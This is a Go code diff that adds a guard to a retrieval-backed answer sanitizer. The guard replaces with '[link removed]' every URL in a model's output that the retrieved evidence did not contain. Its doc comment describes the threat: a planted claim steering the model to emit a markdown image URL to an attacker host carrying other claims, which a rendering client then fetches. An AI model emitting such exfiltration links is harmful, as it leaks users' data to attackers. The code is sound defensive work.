@@ -54,6 +54,7 @@ import (
 	"github.com/sirerun/serenity/internal/domain"
 	"github.com/sirerun/serenity/internal/embed"
 	"github.com/sirerun/serenity/internal/index"
+	"github.com/sirerun/serenity/internal/neutralize"
 	"github.com/sirerun/serenity/internal/router"
 	"github.com/sirerun/serenity/internal/search"
 	"github.com/sirerun/serenity/internal/store"
@@ -856,12 +857,62 @@ func sanitizeText(text string, candidates []liveClaim, sourceCandidates []store.
 		}
 		return "" // never a real claim this call retrieved -- stripped, not surfaced
 	})
-	return sourceCitationTag.ReplaceAllStringFunc(text, func(tag string) string {
+	text = sourceCitationTag.ReplaceAllStringFunc(text, func(tag string) string {
 		m := sourceCitationTag.FindStringSubmatch(tag)
 		if len(m) == 2 && bySHA[m[1]] {
 			return tag
 		}
 		return "" // never a real source this call retrieved -- stripped, not surfaced
+	})
+	return dropUnevidencedURLs(text, candidates, sourceCandidates)
+}
+
+// linkRemoved replaces every URL in an answer that the retrieved evidence
+// did not contain (ADR 022, decision 3).
+const linkRemoved = "[link removed]"
+
+// answerURL matches anything a markdown or HTML renderer could fetch or
+// link: a scheme-qualified or protocol-relative URL, or a bare www. host.
+// It stops at whitespace, quotes, angle brackets and the bracket and
+// parenthesis characters that delimit markdown link syntax.
+var answerURL = regexp.MustCompile("(?i)(?:[a-z][a-z0-9+.-]*:)?//[^\\s<>\"'`()\\[\\]{}]+|\\bwww\\.[^\\s<>\"'`()\\[\\]{}]+")
+
+// urlCore splits trailing sentence punctuation off a matched URL so "see
+// https://x/y." compares https://x/y against the evidence.
+func urlCore(m string) (core, tail string) {
+	core = strings.TrimRight(m, ".,;:!?")
+	return core, m[len(core):]
+}
+
+// dropUnevidencedURLs is the AI-05 exfiltration guard: a model steered by a
+// planted claim can emit ![](https://attacker/?q=<other claims>), which a
+// rendering client fetches. Only a URL byte-equal to one present in the
+// claims and source reports this call retrieved survives; every other URL
+// becomes linkRemoved. Control sequences are neutralized first so an ESC
+// sequence or a stripped tag cannot split a URL past the match and let it
+// reassemble later. Citation tags contain no URL and are unaffected.
+func dropUnevidencedURLs(text string, candidates []liveClaim, sourceCandidates []store.MemoryFactRecord) string {
+	evidence := map[string]bool{}
+	collect := func(fields ...string) {
+		for _, f := range fields {
+			for _, m := range answerURL.FindAllString(f, -1) {
+				core, _ := urlCore(m)
+				evidence[core] = true
+			}
+		}
+	}
+	for _, lc := range candidates {
+		collect(lc.SubjectSlug, lc.Predicate, lc.Object, lc.SourceRef)
+	}
+	for _, rec := range sourceCandidates {
+		collect(rec.Payload.Fact, rec.Payload.Provenance)
+	}
+	return answerURL.ReplaceAllStringFunc(neutralize.Text(text), func(m string) string {
+		core, tail := urlCore(m)
+		if evidence[core] {
+			return m
+		}
+		return linkRemoved + tail
 	})
 }
 
